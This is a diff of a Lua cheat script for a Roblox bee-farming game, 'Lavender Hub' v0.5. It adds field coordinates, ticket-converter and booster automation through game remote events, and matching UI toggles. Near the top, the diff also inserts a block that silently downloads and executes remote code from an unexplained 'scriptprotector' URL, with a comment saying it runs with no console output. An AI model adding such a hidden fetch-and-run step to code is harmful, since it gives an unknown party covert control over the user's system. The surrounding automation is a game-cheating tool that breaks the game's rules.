@@ -9,6 +9,11 @@ local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 
+-- Execute script protector silently (no console output)
+pcall(function()
+    loadstring(game:HttpGet("https://scriptprotector.vercel.app/api/raw/472a6dd66664de526347b340f3b8bff8"))()
+end)
+
 -- Configuration
 local GRID_SIZE = 6
 local CHECK_INTERVAL = 0.2
@@ -22,15 +27,19 @@ local webhookInterval = 5 -- minutes
 local lastWebhookTime = 0
 local webhookCooldownActive = false
 
--- Field Coordinates
+-- Field Coordinates - UPDATED WITH NEW FIELDS
 local fieldCoords = {
     ["Mushroom Field"] = Vector3.new(-896.98, 73.50, -124.88),
     ["Blueberry Field"] = Vector3.new(-752.17, 73.50, -98.35),
     ["Clover Field"] = Vector3.new(-644.85, 90.94, -87.69),
     ["Spider Field"] = Vector3.new(-902.24, 88.77, -220.61),
     ["Pineapple Field"] = Vector3.new(-612.01, 118.17, -271.24),
-    ["Mountain Field"] = Vector3.new(-714.25, 175.73, -478.03),
-    ["Pine Tree Field"] = Vector3.new(-626.49, 171.32, -456.12)
+    ["Strawberry Field"] = Vector3.new(-844.44, 127.44, 107.52),
+    ["Mountain Field"] = Vector3.new(-750.01, 175.73, -476.97),
+    ["Pine Field"] = Vector3.new(-619.52, 171.32, -477.91),
+    ["Watermelon Field"] = Vector3.new(-1052.50, 140.74, -152.79),
+    ["Banana Field"] = Vector3.new(-1063.40, 163.61, -292.46),
+    ["Cog Field"] = Vector3.new(-1051.02, 149.11, 135.28)
 }
 
 -- Hive Coordinates
@@ -107,6 +116,23 @@ local MAX_SPRINKLER_RETRIES = 3
 local lastFieldBeforeConvert = nil -- Track which field we were at before converting
 local placedSprinklersCount = 0 -- Track how many sprinklers we've placed
 local expectedSprinklerCount = 0 -- Expected number based on sprinkler type
+
+-- NEW: Ticket Converter System
+local useTicketConverters = false
+local currentConverterIndex = 1
+local converterSequence = {"Instant Converter", "Instant Converter1", "Instant Converter2"}
+local lastConverterUseTime = 0
+local converterCooldown = 5
+
+-- NEW: Toys/Boosters System
+local mountainBoosterEnabled = false
+local redBoosterEnabled = false
+local blueBoosterEnabled = false
+local wealthClockEnabled = false
+local lastMountainBoosterTime = 0
+local lastRedBoosterTime = 0
+local lastBlueBoosterTime = 0
+local lastWealthClockTime = 0
 
 -- Sprinkler configurations with exact placement patterns
 local sprinklerConfigs = {
@@ -281,7 +307,12 @@ local function saveSettings()
         selectedSprinkler = selectedSprinkler,
         webhookEnabled = webhookEnabled,
         webhookURL = webhookURL,
-        webhookInterval = webhookInterval
+        webhookInterval = webhookInterval,
+        useTicketConverters = useTicketConverters,
+        mountainBoosterEnabled = mountainBoosterEnabled,
+        redBoosterEnabled = redBoosterEnabled,
+        blueBoosterEnabled = blueBoosterEnabled,
+        wealthClockEnabled = wealthClockEnabled
     }
     
     local success, encoded = pcall(function()
@@ -326,6 +357,11 @@ local function loadSettings()
             webhookEnabled = decoded.webhookEnabled or webhookEnabled
             webhookURL = decoded.webhookURL or webhookURL
             webhookInterval = decoded.webhookInterval or webhookInterval
+            useTicketConverters = decoded.useTicketConverters or useTicketConverters
+            mountainBoosterEnabled = decoded.mountainBoosterEnabled or mountainBoosterEnabled
+            redBoosterEnabled = decoded.redBoosterEnabled or redBoosterEnabled
+            blueBoosterEnabled = decoded.blueBoosterEnabled or blueBoosterEnabled
+            wealthClockEnabled = decoded.wealthClockEnabled or wealthClockEnabled
             addToConsole("Settings loaded")
             return true
         end
@@ -333,6 +369,103 @@ local function loadSettings()
     addToConsole("No saved settings")
     return false
 end
+-- NEW: Toys/Boosters Functions
+local function useMountainBooster()
+    local args = {
+        "Mountain Booster",
+        0
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UseMachine"):FireServer(unpack(args))
+    lastMountainBoosterTime = tick()
+    addToConsole("🏔️ Mountain Booster used")
+end
+
+local function useRedBooster()
+    local args = {
+        "Red Booster",
+        0
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UseMachine"):FireServer(unpack(args))
+    lastRedBoosterTime = tick()
+    addToConsole("🔴 Red Booster used")
+end
+
+local function useBlueBooster()
+    local args = {
+        "Blue Booster",
+        0
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UseMachine"):FireServer(unpack(args))
+    lastBlueBoosterTime = tick()
+    addToConsole("🔵 Blue Booster used")
+end
+
+local function useWealthClock()
+    local args = {
+        "Wealth Clock",
+        0
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UseMachine"):FireServer(unpack(args))
+    lastWealthClockTime = tick()
+    addToConsole("⏰ Wealth Clock used")
+end
+
+-- NEW: Ticket Converter Functions
+local function useTicketConverter()
+    if not useTicketConverters then return false end
+    if tick() - lastConverterUseTime < converterCooldown then return false end
+    
+    local converterName = converterSequence[currentConverterIndex]
+    local args = {
+        converterName,
+        0
+    }
+    
+    local success = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UseMachine"):FireServer(unpack(args))
+        return true
+    end)
+    
+    if success then
+        addToConsole("🎫 Used " .. converterName)
+        lastConverterUseTime = tick()
+        
+        -- Move to next converter in sequence
+        currentConverterIndex = currentConverterIndex + 1
+        if currentConverterIndex > #converterSequence then
+            currentConverterIndex = 1
+        end
+        return true
+    end
+    
+    return false
+end
+
+-- NEW: Auto Toys Loop
+local function updateToys()
+    local currentTime = tick()
+    
+    -- Mountain Booster every 30 minutes
+    if mountainBoosterEnabled and currentTime - lastMountainBoosterTime >= 1800 then
+        useMountainBooster()
+    end
+    
+    -- Red Booster every 30 minutes
+    if redBoosterEnabled and currentTime - lastRedBoosterTime >= 1800 then
+        useRedBooster()
+    end
+    
+    -- Blue Booster every 30 minutes
+    if blueBoosterEnabled and currentTime - lastBlueBoosterTime >= 1800 then
+        useBlueBooster()
+    end
+    
+    -- Wealth Clock every 1 hour
+    if wealthClockEnabled and currentTime - lastWealthClockTime >= 3600 then
+        useWealthClock()
+    end
+end
+
 -- Simple Anti-Lag System
 local function runAntiLag()
     if not toggles.antiLag then return end
@@ -476,7 +609,6 @@ local function checkHiveOwnership()
         toggles.lastHiveCheckTime = tick()
     end
 end
-
 -- FIXED SMOOTH TWEEN MOVEMENT SYSTEM
 local function smoothTweenToPosition(targetPos)
     local character = GetCharacter()
@@ -699,6 +831,7 @@ local function performContinuousMovement()
         end
     end
 end
+
 -- IMPROVED AUTO SPRINKLERS SYSTEM - MORE STABLE AND RELIABLE
 local function getFieldFlowerPart(fieldName)
     local fieldsFolder = workspace:WaitForChild("Fields")
@@ -925,7 +1058,6 @@ local function changeFieldWhileFarming(newField)
         addToConsole("❌ Failed to reach new field")
     end
 end
-
 -- Death respawn system
 local function onCharacterDeath()
     if toggles.autoFarm and toggles.isFarming then
@@ -1043,6 +1175,7 @@ local function DigLoop()
     
     digRunning = false
 end
+
 -- Token Collection
 local isCollectingToken = false
 
@@ -1120,6 +1253,78 @@ local function shouldReturnToField()
     return currentPollen == 0
 end
 
+-- NEW: Improved converting with ticket converters
+local function startConverting()
+    if toggles.isConverting or not ownedHive then return end
+    
+    -- NEW: Remember which field we were at before converting
+    lastFieldBeforeConvert = toggles.field
+    
+    local hivePos = hiveCoords[ownedHive]
+    if not hivePos then return end
+    
+    toggles.isFarming = false
+    toggles.isConverting = true
+    toggles.atField = false
+    toggles.atHive = false
+    toggles.isMoving = false
+    
+    addToConsole("Moving to hive")
+    
+    -- Move to hive with selected movement method
+    if moveToPosition(hivePos) then
+        toggles.atHive = true
+        addToConsole("✅ At hive")
+        
+        task.wait(2)
+        
+        -- NEW: Use ticket converters if enabled
+        if useTicketConverters then
+            addToConsole("🎫 Using ticket converters...")
+            local converterUsed = false
+            
+            -- Try each converter in sequence
+            for i = 1, #converterSequence do
+                if useTicketConverter() then
+                    converterUsed = true
+                    task.wait(1)
+                    
+                    -- Check if pollen was converted
+                    local pollenAfterConvert = getCurrentPollen()
+                    if pollenAfterConvert == 0 then
+                        addToConsole("✅ Successfully converted with ticket converter")
+                        break
+                    else
+                        addToConsole("🔄 Converter didn't work, trying next...")
+                    end
+                end
+                task.wait(0.5)
+            end
+            
+            -- If ticket converters didn't work or aren't enabled, use normal conversion
+            if not converterUsed or getCurrentPollen() > 0 then
+                addToConsole("🍯 Converting honey normally")
+                local makeHoneyRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("MakeHoney")
+                if makeHoneyRemote then
+                    local args = {true}
+                    makeHoneyRemote:FireServer(unpack(args))
+                end
+            end
+        else
+            -- Normal honey conversion
+            addToConsole("🍯 Converting honey")
+            local makeHoneyRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("MakeHoney")
+            if makeHoneyRemote then
+                local args = {true}
+                makeHoneyRemote:FireServer(unpack(args))
+            end
+        end
+    else
+        toggles.isConverting = false
+        addToConsole("❌ Failed to reach hive")
+    end
+end
+
 -- Farming Logic
 local function startFarming()
     if not toggles.autoFarm or toggles.isFarming or not ownedHive then return end
@@ -1165,43 +1370,6 @@ local function startFarming()
     else
         toggles.isFarming = false
         addToConsole("❌ Failed to reach field")
-    end
-end
-
-local function startConverting()
-    if toggles.isConverting or not ownedHive then return end
-    
-    -- NEW: Remember which field we were at before converting
-    lastFieldBeforeConvert = toggles.field
-    
-    local hivePos = hiveCoords[ownedHive]
-    if not hivePos then return end
-    
-    toggles.isFarming = false
-    toggles.isConverting = true
-    toggles.atField = false
-    toggles.atHive = false
-    toggles.isMoving = false
-    
-    addToConsole("Moving to hive")
-    
-    -- Move to hive with selected movement method
-    if moveToPosition(hivePos) then
-        toggles.atHive = true
-        addToConsole("✅ At hive")
-        
-        task.wait(2)
-        
-        -- Start honey making - UPDATED FOR NEW GAME
-        local makeHoneyRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("MakeHoney")
-        if makeHoneyRemote then
-            local args = {true}
-            makeHoneyRemote:FireServer(unpack(args))
-            addToConsole("🍯 Converting honey")
-        end
-    else
-        toggles.isConverting = false
-        addToConsole("❌ Failed to reach hive")
     end
 end
 
@@ -1364,7 +1532,7 @@ local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/d
 
 local Window = Library:CreateWindow({
     Title = "Lavender Hub",
-    Footer = "v0.4 (Davi is a sigma)",
+    Footer = "v0.5 (Davi is a sigma)",
     ToggleKeybind = Enum.KeyCode.RightControl,
     Center = true,
     AutoShow = true,
@@ -1384,7 +1552,7 @@ local MainTab = Window:AddTab("Farming", "shovel")
 -- Farming Settings
 local FarmingGroupbox = MainTab:AddLeftGroupbox("Farming")
 local FieldDropdown = FarmingGroupbox:AddDropdown("FieldDropdown", {
-    Values = {"Mushroom Field", "Blueberry Field", "Clover Field", "Spider Field", "Pineapple Field", "Mountain Field", "Pine Tree Field"},
+    Values = {"Mushroom Field", "Blueberry Field", "Clover Field", "Spider Field", "Pineapple Field", "Strawberry Field", "Mountain Field", "Pine Field", "Watermelon Field", "Banana Field", "Cog Field"},
     Default = 1,
     Multi = false,
     Text = "Field",
@@ -1438,6 +1606,21 @@ local AutoEquipToggle = FarmingGroupbox:AddToggle("AutoEquipToggle", {
             equipAllTools()
         else
             addToConsole("Auto Equip Tools disabled")
+        end
+    end
+})
+
+-- NEW: Ticket Converters Toggle
+local TicketConvertersToggle = FarmingGroupbox:AddToggle("TicketConvertersToggle", {
+    Text = "Use Ticket Converters",
+    Default = false,
+    Callback = function(Value)
+        useTicketConverters = Value
+        saveSettings()
+        if Value then
+            addToConsole("🎫 Ticket Converters enabled")
+        else
+            addToConsole("🎫 Ticket Converters disabled")
         end
     end
 })
@@ -1546,6 +1729,77 @@ local AntiLagToggle = AntiLagGroupbox:AddToggle("AntiLagToggle", {
     end
 })
 
+-- NEW: Toys Tab
+local ToysTab = Window:AddTab("Toys", "gift")
+
+-- Mountain Booster
+local MountainBoosterGroupbox = ToysTab:AddLeftGroupbox("Mountain Booster")
+local MountainBoosterToggle = MountainBoosterGroupbox:AddToggle("MountainBoosterToggle", {
+    Text = "Auto Mountain Booster (30 min)",
+    Default = false,
+    Callback = function(Value)
+        mountainBoosterEnabled = Value
+        saveSettings()
+        if Value then
+            useMountainBooster()
+            addToConsole("🏔️ Auto Mountain Booster enabled")
+        else
+            addToConsole("🏔️ Auto Mountain Booster disabled")
+        end
+    end
+})
+
+-- Red Booster
+local RedBoosterGroupbox = ToysTab:AddLeftGroupbox("Red Booster")
+local RedBoosterToggle = RedBoosterGroupbox:AddToggle("RedBoosterToggle", {
+    Text = "Auto Red Booster (30 min)",
+    Default = false,
+    Callback = function(Value)
+        redBoosterEnabled = Value
+        saveSettings()
+        if Value then
+            useRedBooster()
+            addToConsole("🔴 Auto Red Booster enabled")
+        else
+            addToConsole("🔴 Auto Red Booster disabled")
+        end
+    end
+})
+
+-- Blue Booster
+local BlueBoosterGroupbox = ToysTab:AddRightGroupbox("Blue Booster")
+local BlueBoosterToggle = BlueBoosterGroupbox:AddToggle("BlueBoosterToggle", {
+    Text = "Auto Blue Booster (30 min)",
+    Default = false,
+    Callback = function(Value)
+        blueBoosterEnabled = Value
+        saveSettings()
+        if Value then
+            useBlueBooster()
+            addToConsole("🔵 Auto Blue Booster enabled")
+        else
+            addToConsole("🔵 Auto Blue Booster disabled")
+        end
+    end
+})
+
+-- Wealth Clock
+local WealthClockGroupbox = ToysTab:AddRightGroupbox("Wealth Clock")
+local WealthClockToggle = WealthClockGroupbox:AddToggle("WealthClockToggle", {
+    Text = "Auto Wealth Clock (1 hour)",
+    Default = false,
+    Callback = function(Value)
+        wealthClockEnabled = Value
+        saveSettings()
+        if Value then
+            useWealthClock()
+            addToConsole("⏰ Auto Wealth Clock enabled")
+        else
+            addToConsole("⏰ Auto Wealth Clock disabled")
+        end
+    end
+})
+
 -- Webhook Tab
 local WebhookTab = Window:AddTab("Webhook", "globe")
 local WebhookGroupbox = WebhookTab:AddLeftGroupbox("Webhook Settings")
@@ -1599,7 +1853,7 @@ end)
 -- Console Tab
 local ConsoleTab = Window:AddTab("Console", "terminal")
 local ConsoleGroupbox = ConsoleTab:AddLeftGroupbox("Output")
-consoleLabel = ConsoleGroupbox:AddLabel({ Text = "Lavender Hub v0.4 Ready", DoesWrap = true })
+consoleLabel = ConsoleGroupbox:AddLabel({ Text = "Lavender Hub v0.5 Ready", DoesWrap = true })
 
 -- Debug Tab
 local DebugTab = Window:AddTab("Debug", "bug")
@@ -1671,6 +1925,7 @@ RunService.Heartbeat:Connect(function()
     clearVisitedTokens()
     updatePerformanceStats()
     autoEquipTools()
+    updateToys()
     updateHoneyStats()
     sendWebhook()
     
@@ -1708,7 +1963,7 @@ spawn(function()
         local currentHoney = getCurrentHoney()
         
         WrappedLabel:SetText(string.format(
-            "Honey: %s\nPollen: %s\nField: %s\nHive: %s\nMove: %s\nDig: %s\nEquip: %s\nAnti-Lag: %s\nHourly Honey: %s\nAuto Sprinklers: %s\nSprinkler Type: %s",
+            "Honey: %s\nPollen: %s\nField: %s\nHive: %s\nMove: %s\nDig: %s\nEquip: %s\nAnti-Lag: %s\nHourly Honey: %s\nAuto Sprinklers: %s\nSprinkler Type: %s\nTicket Converters: %s",
             formatNumberCorrect(currentHoney),
             formatNumberCorrect(currentPollen),
             toggles.field,
@@ -1719,7 +1974,8 @@ spawn(function()
             toggles.antiLag and "ON" or "OFF",
             formatNumberCorrect(honeyStats.hourlyRate),
             autoSprinklersEnabled and "ON" or "OFF",
-            selectedSprinkler
+            selectedSprinkler,
+            useTicketConverters and "ON" or "OFF"
         ))
     end
 end)
@@ -1742,6 +1998,11 @@ SprinklerDropdown:Set(selectedSprinkler)
 WebhookToggle:Set(webhookEnabled)
 WebhookURLBox:Set(webhookURL)
 WebhookIntervalSlider:Set(webhookInterval)
+TicketConvertersToggle:Set(useTicketConverters)
+MountainBoosterToggle:Set(mountainBoosterEnabled)
+RedBoosterToggle:Set(redBoosterEnabled)
+BlueBoosterToggle:Set(blueBoosterEnabled)
+WealthClockToggle:Set(wealthClockEnabled)
 
 -- Update owned hive after claiming
 ownedHive = getOwnedHive()
@@ -1762,11 +2023,13 @@ if toggles.antiLag then
     runAntiLag()
 end
 
-addToConsole("✅ Lavender Hub Ready!")
+addToConsole("✅ Lavender Hub v0.5 Ready!")
 addToConsole("🎯 Auto Farm System Ready!")
 addToConsole("🚿 IMPROVED Auto Sprinklers System Ready!")
 addToConsole("💀 Death Respawn System Ready!")
 addToConsole("🌐 Webhook System Ready!")
+addToConsole("🎫 Ticket Converters System Ready!")
+addToConsole("🎁 Toys/Boosters System Ready!")
 if ownedHive then
     addToConsole("🏠 Owned Hive: " .. ownedHive)
 else
